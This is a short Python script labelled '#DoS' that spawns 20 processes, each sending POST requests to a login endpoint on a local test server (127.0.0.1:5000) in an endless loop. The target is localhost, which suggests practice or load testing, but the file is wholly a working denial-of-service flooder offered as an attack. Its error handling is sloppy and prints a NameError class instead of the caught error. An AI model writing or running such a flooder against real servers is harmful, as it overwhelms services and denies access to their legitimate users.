#DoS

import requests
import multiprocessing

url = 'http://127.0.0.1:5000'

def atack():
    while True:
        try:
            requests.post(url, data={"username": "teste", "password": "teste"})
        except:
            print(NameError)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    processos = []

    for i in range(20):
        p = multiprocessing.Process(target = atack)
        p.start()
        processos.append(p)
